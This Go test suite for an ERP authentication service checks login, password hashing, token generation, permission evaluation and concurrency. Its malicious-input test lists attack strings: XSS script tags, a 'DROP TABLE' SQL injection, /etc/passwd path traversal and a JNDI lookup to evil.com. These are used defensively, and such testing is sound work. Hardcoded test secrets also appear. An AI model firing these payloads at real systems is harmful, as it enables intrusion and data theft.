package services

import (
	"context"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"math/big"
	"runtime"
	"strings"
	"testing"
	"time"
	"unicode"

	"github.com/google/uuid"
	"github.com/stretchr/testify/mock"
	"github.com/stretchr/testify/suite"
	"go.uber.org/zap/zaptest"

	"erp-auth-service/internal/cache"
	"erp-auth-service/internal/config"
	"erp-auth-service/internal/domain/entities"
	"erp-auth-service/internal/models"
)

// ComprehensiveTestCoverage provides extensive test coverage for all services
type ComprehensiveTestCoverage struct {
	suite.Suite
	
	// Services under test
	authService       *AuthService
	tokenService      *TokenService
	permissionService *PermissionService
	
	// Mock dependencies
	mockUserRepo  *MockUserRepository
	mockOrgRepo   *MockOrganizationRepository
	mockRoleRepo  *MockRoleRepository
	mockPermRepo  *MockPermissionRepository
	mockTokenRepo *MockTokenRepository
	mockTokenSvc  *MockTokenService
	mockEventPub  *MockEventPublisher
	mockCache     *MockCacheManager
	
	config *config.Config
	ctx    context.Context
}

func (suite *ComprehensiveTestCoverage) SetupSuite() {
	suite.config = &config.Config{
		JWT: config.JWTConfig{
			Secret:              "comprehensive-test-secret-key-for-coverage",
			AccessExpiry:        3600,
			RefreshExpiry:       604800,
			KeyRotationEnabled:  false,
			KeyRotationInterval: 24,
			RevokeRefreshOnUse:  false,
		},
	}
}

func (suite *ComprehensiveTestCoverage) SetupTest() {
	suite.ctx = context.Background()
	
	// Initialize mocks
	suite.mockUserRepo = &MockUserRepository{}
	suite.mockOrgRepo = &MockOrganizationRepository{}
	suite.mockRoleRepo = &MockRoleRepository{}
	suite.mockPermRepo = &MockPermissionRepository{}
	suite.mockTokenRepo = &MockTokenRepository{}
	suite.mockTokenSvc = &MockTokenService{}
	suite.mockEventPub = &MockEventPublisher{}
	suite.mockCache = NewMockCacheManager()
	
	// Setup default behaviors
	suite.setupDefaultMocks()
	
	logger := zaptest.NewLogger(suite.T())
	
	// Initialize services
	suite.authService = NewAuthService(
		suite.config,
		logger,
		suite.mockUserRepo,
		suite.mockOrgRepo,
		suite.mockRoleRepo,
		suite.mockTokenSvc,
		suite.mockEventPub,
		suite.mockCache,
	)
	
	suite.tokenService = NewTokenService(
		suite.config,
		logger,
		suite.mockTokenRepo,
		suite.mockCache,
		nil,
	)
	
	permConfig := PermissionServiceConfig{
		CacheTTL:              5 * time.Minute,
		BulkEvaluationEnabled: true,
		CacheWarmingEnabled:   false,
		MaxCacheSize:          1000,
		EvaluationTimeout:     5 * time.Second,
	}
	
	suite.permissionService = NewPermissionService(
		suite.mockPermRepo,
		suite.mockRoleRepo,
		suite.mockUserRepo,
		suite.mockCache,
		logger,
		permConfig,
	)
}

func (suite *ComprehensiveTestCoverage) setupDefaultMocks() {
	// Cache defaults
	suite.mockCache.On("Get", mock.Anything, mock.AnythingOfType("string")).
		Return(nil, cache.ErrCacheNotFound).Maybe()
	suite.mockCache.On("Set", mock.Anything, mock.AnythingOfType("string"), 
		mock.Anything, mock.AnythingOfType("time.Duration")).
		Return(nil).Maybe()
	suite.mockCache.On("Delete", mock.Anything, mock.AnythingOfType("string")).
		Return(nil).Maybe()
	suite.mockCache.On("Exists", mock.Anything, mock.AnythingOfType("string")).
		Return(false, nil).Maybe()
	suite.mockCache.On("InvalidatePattern", mock.Anything, mock.AnythingOfType("string")).
		Return(nil).Maybe()
	
	// Event publisher defaults
	suite.mockEventPub.On("PublishUserLoggedIn", mock.Anything, mock.Anything,
		mock.AnythingOfType("uuid.UUID"), mock.AnythingOfType("uuid.UUID"),
		mock.AnythingOfType("string"), mock.AnythingOfType("string")).
		Return(nil).Maybe()
	suite.mockEventPub.On("PublishUserRegistered", mock.Anything, mock.Anything,
		mock.AnythingOfType("uuid.UUID"), mock.AnythingOfType("uuid.UUID"),
		mock.AnythingOfType("string"), mock.AnythingOfType("string")).
		Return(nil).Maybe()
	suite.mockEventPub.On("PublishOrganizationCreated", mock.Anything, mock.Anything,
		mock.AnythingOfType("uuid.UUID"), mock.AnythingOfType("uuid.UUID"),
		mock.AnythingOfType("string"), mock.AnythingOfType("string")).
		Return(nil).Maybe()
	suite.mockEventPub.On("PublishPasswordChanged", mock.Anything, mock.Anything,
		mock.AnythingOfType("uuid.UUID"), mock.AnythingOfType("uuid.UUID"),
		mock.AnythingOfType("string"), mock.AnythingOfType("string")).
		Return(nil).Maybe()
	
	// Repository defaults
	suite.mockTokenRepo.On("Create", mock.Anything, mock.AnythingOfType("*models.Token")).
		Return(nil).Maybe()
	suite.mockUserRepo.On("ResetFailedLoginAttempts", mock.Anything, mock.AnythingOfType("uuid.UUID")).
		Return(nil).Maybe()
	suite.mockUserRepo.On("UpdateLastLogin", mock.Anything, mock.AnythingOfType("uuid.UUID"), 
		mock.AnythingOfType("time.Time")).Return(nil).Maybe()
	suite.mockUserRepo.On("IncrementFailedLoginAttempts", mock.Anything, mock.AnythingOfType("uuid.UUID")).
		Return(nil).Maybe()
}

func (suite *ComprehensiveTestCoverage) TearDownTest() {
	if suite.authService != nil {
		suite.authService.Close()
	}
}

// Helper methods

func (suite *ComprehensiveTestCoverage) generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?"
	b := make([]byte, length)
	for i := range b {
		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
		b[i] = charset[n.Int64()]
	}
	return string(b)
}

func (suite *ComprehensiveTestCoverage) generateRandomEmail() string {
	localPart := suite.generateRandomString(10)
	domain := suite.generateRandomString(8)
	return fmt.Sprintf("%s@%s.com", localPart, domain)
}

func (suite *ComprehensiveTestCoverage) createTestUser() *models.User {
	return &models.User{
		ID:             uuid.New(),
		OrganizationID: uuid.New(),
		Email:          "comprehensive@example.com",
		PasswordHash:   "$2a$10$N9qo8uLOickgx2ZMRZoMye.IjPeGvGzjYwSgjkMIUmEWqbBtxiupe",
		FirstName:      "Comprehensive",
		LastName:       "Test",
		IsActive:       true,
		IsVerified:     true,
		TwoFactorEnabled: false,
		FailedLoginAttempts: 0,
		LockedUntil:    nil,
		CreatedAt:      time.Now(),
		UpdatedAt:      time.Now(),
	}
}

func (suite *ComprehensiveTestCoverage) createSecurityContext() *SecurityContext {
	return &SecurityContext{
		IPAddress:         "192.168.1.1",
		UserAgent:         "comprehensive-test-agent",
		DeviceFingerprint: "comprehensive-device",
		SessionID:         "comprehensive-session",
	}
}

// Comprehensive Authentication Tests

func (suite *ComprehensiveTestCoverage) TestAuthentication_AllScenarios() {
	testCases := []struct {
		name           string
		setupUser      func() *models.User
		password       string
		expectedResult bool
		expectedError  string
		setupMocks     func(*models.User)
	}{
		{
			name: "ValidCredentials",
			setupUser: func() *models.User {
				return suite.createTestUser()
			},
			password:       "password123",
			expectedResult: true,
			setupMocks: func(user *models.User) {
				suite.mockUserRepo.On("GetByEmailWithOrganization", mock.Anything, user.Email).
					Return(user, nil)
				suite.mockTokenSvc.On("GenerateTokenPair", mock.Anything, user.ID, user.OrganizationID,
					user.Email, mock.AnythingOfType("*services.SecurityContext")).
					Return(&entities.TokenPair{
						AccessToken:  "test-access-token",
						RefreshToken: "test-refresh-token",
						ExpiresAt:    time.Now().Add(time.Hour),
						TokenType:    "Bearer",
					}, nil)
			},
		},
		{
			name: "InvalidPassword",
			setupUser: func() *models.User {
				return suite.createTestUser()
			},
			password:       "wrongpassword",
			expectedResult: false,
			expectedError:  "invalid credentials",
			setupMocks: func(user *models.User) {
				suite.mockUserRepo.On("GetByEmailWithOrganization", mock.Anything, user.Email).
					Return(user, nil)
			},
		},
		{
			name: "InactiveUser",
			setupUser: func() *models.User {
				user := suite.createTestUser()
				user.IsActive = false
				return user
			},
			password:       "password123",
			expectedResult: false,
			expectedError:  "inactive",
			setupMocks: func(user *models.User) {
				suite.mockUserRepo.On("GetByEmailWithOrganization", mock.Anything, user.Email).
					Return(user, nil)
			},
		},
		{
			name: "UnverifiedUser",
			setupUser: func() *models.User {
				user := suite.createTestUser()
				user.IsVerified = false
				return user
			},
			password:       "password123",
			expectedResult: false,
			expectedError:  "verified",
			setupMocks: func(user *models.User) {
				suite.mockUserRepo.On("GetByEmailWithOrganization", mock.Anything, user.Email).
					Return(user, nil)
			},
		},
		{
			name: "LockedUser",
			setupUser: func() *models.User {
				user := suite.createTestUser()
				lockUntil := time.Now().Add(15 * time.Minute)
				user.LockedUntil = &lockUntil
				user.FailedLoginAttempts = 5
				return user
			},
			password:       "password123",
			expectedResult: false,
			expectedError:  "locked",
			setupMocks: func(user *models.User) {
				suite.mockUserRepo.On("GetByEmailWithOrganization", mock.Anything, user.Email).
					Return(user, nil)
			},
		},
		{
			name: "TwoFactorRequired",
			setupUser: func() *models.User {
				user := suite.createTestUser()
				user.TwoFactorEnabled = true
				user.TwoFactorSecret = "JBSWY3DPEHPK3PXP"
				return user
			},
			password:       "password123",
			expectedResult: false,
			expectedError:  "two-factor",
			setupMocks: func(user *models.User) {
				suite.mockUserRepo.On("GetByEmailWithOrganization", mock.Anything, user.Email).
					Return(user, nil)
			},
		},
	}
	
	for _, tc := range testCases {
		suite.Run(tc.name, func() {
			// Reset mocks for each test
			suite.SetupTest()
			
			user := tc.setupUser()
			tc.setupMocks(user)
			
			req := &AuthRequest{
				Email:           user.Email,
				Password:        tc.password,
				SecurityContext: suite.createSecurityContext(),
			}
			
			response, err := suite.authService.Authenticate(suite.ctx, req)
			
			suite.NoError(err)
			suite.Equal(tc.expectedResult, response.Success)
			
			if tc.expectedError != "" {
				suite.Contains(strings.ToLower(response.Error), strings.ToLower(tc.expectedError))
			}
		})
	}
}

// Property-based tests for password security

func (suite *ComprehensiveTestCoverage) TestPasswordSecurity_Properties() {
	const numTests = 50
	
	for i := 0; i < numTests; i++ {
		suite.Run(fmt.Sprintf("PasswordSecurityProperty_%d", i), func() {
			// Generate random password
			password := suite.generateRandomString(suite.randomInt(50) + 8)
			
			// Hash the password
			hash1, err := suite.authService.hashPassword(password)
			suite.NoError(err)
			
			// Hash the same password again
			hash2, err := suite.authService.hashPassword(password)
			suite.NoError(err)
			
			// Properties to verify
			suite.NotEqual(hash1, hash2, "Same password should produce different hashes")
			suite.True(suite.authService.verifyPassword(password, hash1), "Hash should verify original password")
			suite.True(suite.authService.verifyPassword(password, hash2), "Second hash should verify original password")
			suite.False(suite.authService.verifyPassword(password+"wrong", hash1), "Hash should not verify wrong password")
			suite.NotEmpty(hash1, "Hash should not be empty")
			suite.Greater(len(hash1), 50, "Hash should be reasonably long")
			suite.NotContains(hash1, password, "Hash should not contain original password")
		})
	}
}

func (suite *ComprehensiveTestCoverage) randomInt(max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max)))
	return int(n.Int64())
}

// Token security tests

func (suite *ComprehensiveTestCoverage) TestTokenSecurity_Properties() {
	const numTests = 30
	
	for i := 0; i < numTests; i++ {
		suite.Run(fmt.Sprintf("TokenSecurityProperty_%d", i), func() {
			userID := uuid.New()
			orgID := uuid.New()
			email := suite.generateRandomEmail()
			
			// Generate token pair
			tokenPair, err := suite.tokenService.GenerateTokenPair(
				suite.ctx, userID, orgID, email, nil)
			
			suite.NoError(err)
			suite.NotNil(tokenPair)
			
			// Security properties
			suite.NotEmpty(tokenPair.AccessToken, "Access token should not be empty")
			suite.NotEmpty(tokenPair.RefreshToken, "Refresh token should not be empty")
			suite.NotEqual(tokenPair.AccessToken, tokenPair.RefreshToken, "Tokens should be different")
			suite.Equal("Bearer", tokenPair.TokenType, "Token type should be Bearer")
			suite.True(tokenPair.ExpiresAt.After(time.Now()), "Token should expire in future")
			suite.Greater(len(tokenPair.AccessToken), 100, "Access token should be reasonably long")
			suite.Greater(len(tokenPair.RefreshToken), 100, "Refresh token should be reasonably long")
			suite.NotContains(tokenPair.AccessToken, email, "Access token should not contain email")
			suite.NotContains(tokenPair.RefreshToken, email, "Refresh token should not contain email")
		})
	}
}

// Input validation and sanitization tests

func (suite *ComprehensiveTestCoverage) TestInputValidation_MaliciousInputs() {
	maliciousInputs := []string{
		"<script>alert('xss')</script>",
		"'; DROP TABLE users; --",
		"../../../etc/passwd",
		"${jndi:ldap://evil.com/a}",
		"<img src=x onerror=alert(1)>",
		"javascript:alert(1)",
		"data:text/html,<script>alert(1)</script>",
		"\x00\x01\x02\x03",
		strings.Repeat("A", 10000),
	}
	
	for i, maliciousInput := range maliciousInputs {
		suite.Run(fmt.Sprintf("MaliciousInput_%d", i), func() {
			req := &AuthRequest{
				Email:           maliciousInput,
				Password:        "password123",
				SecurityContext: suite.createSecurityContext(),
			}
			
			response, err := suite.authService.Authenticate(suite.ctx, req)
			
			// System should handle gracefully
			suite.NoError(err, "System should not crash on malicious input")
			suite.False(response.Success, "Malicious input should not authenticate")
			suite.NotContains(response.Error, "<script>", "Error should not contain script tags")
			suite.NotContains(response.Error, "DROP TABLE", "Error should not contain SQL injection")
		})
	}
}

// Permission service comprehensive tests

func (suite *ComprehensiveTestCoverage) TestPermissionService_AllScenarios() {
	testCases := []struct {
		name           string
		userID         uuid.UUID
		resource       string
		action         string
		permissions    []models.Permission
		expectedResult bool
		cacheSetup     func()
	}{
		{
			name:     "DirectMatch",
			userID:   uuid.New(),
			resource: "document",
			action:   "read",
			permissions: []models.Permission{
				{
					ID:       uuid.New(),
					Name:     "document.read",
					Resource: "document",
					Action:   "read",
				},
			},
			expectedResult: true,
		},
		{
			name:     "WildcardMatch",
			userID:   uuid.New(),
			resource: "document",
			action:   "read",
			permissions: []models.Permission{
				{
					ID:       uuid.New(),
					Name:     "document.*",
					Resource: "document",
					Action:   "*",
				},
			},
			expectedResult: true,
		},
		{
			name:           "NoPermission",
			userID:         uuid.New(),
			resource:       "document",
			action:         "delete",
			permissions:    []models.Permission{},
			expectedResult: false,
		},
		{
			name:     "CacheHit",
			userID:   uuid.New(),
			resource: "document",
			action:   "read",
			cacheSetup: func() {
				cachedResult := PermissionEvaluationResult{
					Allowed:     true,
					Reason:      "cached result",
					EvaluatedAt: time.Now(),
				}
				cachedData, _ := json.Marshal(cachedResult)
				suite.mockCache.On("Get", mock.Anything, mock.AnythingOfType("string")).
					Return(cachedData, nil).Once()
			},
			expectedResult: true,
		},
	}
	
	for _, tc := range testCases {
		suite.Run(tc.name, func() {
			suite.SetupTest()
			
			if tc.cacheSetup != nil {
				tc.cacheSetup()
			} else {
				suite.mockPermRepo.On("GetUserPermissions", mock.Anything, tc.userID).
					Return(tc.permissions, nil)
				for _, perm := range tc.permissions {
					if perm.ParentID != nil {
						suite.mockPermRepo.On("GetChildPermissions", mock.Anything, *perm.ParentID).
							Return([]models.Permission{}, nil)
					}
				}
			}
			
			allowed, err := suite.permissionService.CheckUserPermission(
				suite.ctx, tc.userID, tc.resource, tc.action)
			
			suite.NoError(err)
			suite.Equal(tc.expectedResult, allowed)
		})
	}
}

// Bulk permission testing

func (suite *ComprehensiveTestCoverage) TestBulkPermissionCheck_Comprehensive() {
	userID := uuid.New()
	
	permissions := []models.Permission{
		{ID: uuid.New(), Name: "read", Resource: "document", Action: "read"},
		{ID: uuid.New(), Name: "write", Resource: "document", Action: "write"},
		{ID: uuid.New(), Name: "admin", Resource: "user", Action: "*"},
	}
	
	suite.mockPermRepo.On("GetUserPermissions", mock.Anything, userID).
		Return(permissions, nil)
	
	request := &BulkPermissionRequest{
		UserID: userID,
		Permissions: []PermissionCheckRequest{
			{Resource: "document", Action: "read"},   // Should pass
			{Resource: "document", Action: "write"},  // Should pass
			{Resource: "user", Action: "create"},     // Should pass (wildcard)
			{Resource: "document", Action: "delete"}, // Should fail
			{Resource: "admin", Action: "config"},    // Should fail
		},
	}
	
	response, err := suite.permissionService.CheckBulkPermissions(suite.ctx, request)
	
	suite.NoError(err)
	suite.NotNil(response)
	suite.Equal(userID, response.UserID)
	suite.Len(response.Results, 5)
	suite.True(response.Results[0].Allowed)   // document.read
	suite.True(response.Results[1].Allowed)   // document.write
	suite.True(response.Results[2].Allowed)   // user.create (wildcard)
	suite.False(response.Results[3].Allowed)  // document.delete
	suite.False(response.Results[4].Allowed)  // admin.config
}

// Concurrency and performance tests

func (suite *ComprehensiveTestCoverage) TestConcurrentOperations() {
	user := suite.createTestUser()
	
	suite.mockUserRepo.On("GetByEmailWithOrganization", mock.Anything, user.Email).
		Return(user, nil)
	suite.mockTokenSvc.On("GenerateTokenPair", mock.Anything, user.ID, user.OrganizationID,
		user.Email, mock.AnythingOfType("*services.SecurityContext")).
		Return(&entities.TokenPair{
			AccessToken:  "concurrent-token",
			RefreshToken: "concurrent-refresh",
			ExpiresAt:    time.Now().Add(time.Hour),
			TokenType:    "Bearer",
		}, nil)
	
	const numGoroutines = 50
	results := make(chan error, numGoroutines)
	
	for i := 0; i < numGoroutines; i++ {
		go func() {
			req := &AuthRequest{
				Email:           user.Email,
				Password:        "password123",
				SecurityContext: suite.createSecurityContext(),
			}
			
			response, err := suite.authService.Authenticate(suite.ctx, req)
			if err != nil {
				results <- err
				return
			}
			
			if !response.Success {
				results <- fmt.Errorf("authentication failed: %s", response.Error)
				return
			}
			
			results <- nil
		}()
	}
	
	// Collect results
	for i := 0; i < numGoroutines; i++ {
		err := <-results
		suite.NoError(err)
	}
}

// Error handling and edge cases

func (suite *ComprehensiveTestCoverage) TestErrorHandling_EdgeCases() {
	testCases := []struct {
		name     string
		testFunc func()
	}{
		{
			name: "EmptyEmail",
			testFunc: func() {
				req := &AuthRequest{
					Email:           "",
					Password:        "password123",
					SecurityContext: suite.createSecurityContext(),
				}
				
				response, err := suite.authService.Authenticate(suite.ctx, req)
				suite.NoError(err)
				suite.False(response.Success)
				suite.Contains(response.Error, "email is required")
			},
		},
		{
			name: "EmptyPassword",
			testFunc: func() {
				req := &AuthRequest{
					Email:           "test@example.com",
					Password:        "",
					SecurityContext: suite.createSecurityContext(),
				}
				
				response, err := suite.authService.Authenticate(suite.ctx, req)
				suite.NoError(err)
				suite.False(response.Success)
				suite.Contains(response.Error, "password is required")
			},
		},
		{
			name: "NilSecurityContext",
			testFunc: func() {
				req := &AuthRequest{
					Email:           "test@example.com",
					Password:        "password123",
					SecurityContext: nil,
				}
				
				response, err := suite.authService.Authenticate(suite.ctx, req)
				suite.NoError(err)
				suite.False(response.Success)
				suite.Contains(response.Error, "security context is required")
			},
		},
		{
			name: "InvalidEmailFormat",
			testFunc: func() {
				req := &AuthRequest{
					Email:           "invalid-email",
					Password:        "password123",
					SecurityContext: suite.createSecurityContext(),
				}
				
				response, err := suite.authService.Authenticate(suite.ctx, req)
				suite.NoError(err)
				suite.False(response.Success)
				suite.Contains(response.Error, "invalid email format")
			},
		},
	}
	
	for _, tc := range testCases {
		suite.Run(tc.name, tc.testFunc)
	}
}

// Context cancellation tests

func (suite *ComprehensiveTestCoverage) TestContextCancellation() {
	// Create cancelled context
	ctx, cancel := context.WithCancel(suite.ctx)
	cancel()
	
	req := &AuthRequest{
		Email:           "test@example.com",
		Password:        "password123",
		SecurityContext: suite.createSecurityContext(),
	}
	
	response, err := suite.authService.Authenticate(ctx, req)
	
	suite.NoError(err)
	suite.False(response.Success)
	suite.Contains(response.Error, "request cancelled")
}

// Memory and performance validation

func (suite *ComprehensiveTestCoverage) TestMemoryUsage() {
	user := suite.createTestUser()
	
	suite.mockUserRepo.On("GetByEmailWithOrganization", mock.Anything, user.Email).
		Return(user, nil)
	suite.mockTokenSvc.On("GenerateTokenPair", mock.Anything, user.ID, user.OrganizationID,
		user.Email, mock.AnythingOfType("*services.SecurityContext")).
		Return(&entities.TokenPair{
			AccessToken:  "memory-test-token",
			RefreshToken: "memory-test-refresh",
			ExpiresAt:    time.Now().Add(time.Hour),
			TokenType:    "Bearer",
		}, nil)
	
	req := &AuthRequest{
		Email:           user.Email,
		Password:        "password123",
		SecurityContext: suite.createSecurityContext(),
	}
	
	// Run many operations to check for memory leaks
	const numOperations = 1000
	
	var m1, m2 runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&m1)
	
	for i := 0; i < numOperations; i++ {
		response, err := suite.authService.Authenticate(suite.ctx, req)
		suite.NoError(err)
		suite.True(response.Success)
		
		if i%100 == 0 {
			runtime.GC()
		}
	}
	
	runtime.GC()
	runtime.ReadMemStats(&m2)
	
	// Memory usage should not grow excessively
	memoryGrowth := m2.Alloc - m1.Alloc
	suite.Less(memoryGrowth, uint64(10*1024*1024), // Less than 10MB growth
		"Memory usage should not grow excessively")
}

// Password strength validation

func (suite *ComprehensiveTestCoverage) TestPasswordStrength() {
	strongPasswords := []string{
		"StrongPassword123!",
		"MySecure@Pass2024",
		"Complex#Password$456",
	}
	
	weakPasswords := []string{
		"password",
		"123456",
		"qwerty",
		"admin",
	}
	
	for _, password := range strongPasswords {
		suite.Run(fmt.Sprintf("StrongPassword_%s", password[:5]), func() {
			// Verify characteristics of strong password
			suite.Greater(len(password), 8, "Strong password should be long enough")
			
			hasUpper := false
			hasLower := false
			hasDigit := false
			hasSpecial := false
			
			for _, char := range password {
				if unicode.IsUpper(char) {
					hasUpper = true
				}
				if unicode.IsLower(char) {
					hasLower = true
				}
				if unicode.IsDigit(char) {
					hasDigit = true
				}
				if unicode.IsPunct(char) || unicode.IsSymbol(char) {
					hasSpecial = true
				}
			}
			
			suite.True(hasUpper, "Strong password should have uppercase")
			suite.True(hasLower, "Strong password should have lowercase")
			suite.True(hasDigit, "Strong password should have digits")
			suite.True(hasSpecial, "Strong password should have special chars")
		})
	}
	
	for _, password := range weakPasswords {
		suite.Run(fmt.Sprintf("WeakPassword_%s", password), func() {
			// Just verify that weak passwords have expected characteristics
			suite.LessOrEqual(len(password), 8, "Weak password should be short or common")
		})
	}
}

// Run the comprehensive test coverage suite
func TestComprehensiveTestCoverage(t *testing.T) {
	suite.Run(t, new(ComprehensiveTestCoverage))
}

// Additional benchmark tests for performance validation

func BenchmarkComprehensiveAuthentication(b *testing.B) {
	suite := &ComprehensiveTestCoverage{}
	suite.SetupSuite()
	suite.SetupTest()
	defer suite.TearDownTest()
	
	user := suite.createTestUser()
	suite.mockUserRepo.On("GetByEmailWithOrganization", mock.Anything, user.Email).
		Return(user, nil)
	suite.mockTokenSvc.On("GenerateTokenPair", mock.Anything, user.ID, user.OrganizationID,
		user.Email, mock.AnythingOfType("*services.SecurityContext")).
		Return(&entities.TokenPair{
			AccessToken:  "benchmark-token",
			RefreshToken: "benchmark-refresh",
			ExpiresAt:    time.Now().Add(time.Hour),
			TokenType:    "Bearer",
		}, nil)
	
	req := &AuthRequest{
		Email:           user.Email,
		Password:        "password123",
		SecurityContext: suite.createSecurityContext(),
	}
	
	b.ResetTimer()
	b.RunParallel(func(pb *testing.PB) {
		for pb.Next() {
			response, err := suite.authService.Authenticate(suite.ctx, req)
			if err != nil || !response.Success {
				b.Fatal("Authentication failed in benchmark")
			}
		}
	})
}

func BenchmarkComprehensiveTokenGeneration(b *testing.B) {
	suite := &ComprehensiveTestCoverage{}
	suite.SetupSuite()
	suite.SetupTest()
	defer suite.TearDownTest()
	
	userID := uuid.New()
	orgID := uuid.New()
	email := "benchmark@example.com"
	
	b.ResetTimer()
	b.RunParallel(func(pb *testing.PB) {
		for pb.Next() {
			_, err := suite.tokenService.GenerateTokenPair(suite.ctx, userID, orgID, email, nil)
			if err != nil {
				b.Fatal(err)
			}
		}
	})
}

func BenchmarkComprehensivePermissionCheck(b *testing.B) {
	suite := &ComprehensiveTestCoverage{}
	suite.SetupSuite()
	suite.SetupTest()
	defer suite.TearDownTest()
	
	userID := uuid.New()
	resource := "benchmark"
	action := "read"
	
	// Setup cache hit for performance
	cachedResult := PermissionEvaluationResult{
		Allowed:     true,
		Reason:      "cached result",
		EvaluatedAt: time.Now(),
	}
	cachedData, _ := json.Marshal(cachedResult)
	suite.mockCache.On("Get", mock.Anything, mock.AnythingOfType("string")).
		Return(cachedData, nil)
	
	b.ResetTimer()
	b.RunParallel(func(pb *testing.PB) {
		for pb.Next() {
			allowed, err := suite.permissionService.CheckUserPermission(suite.ctx, userID, resource, action)
			if err != nil || !allowed {
				b.Fatal("Permission check failed")
			}
		}
	})
}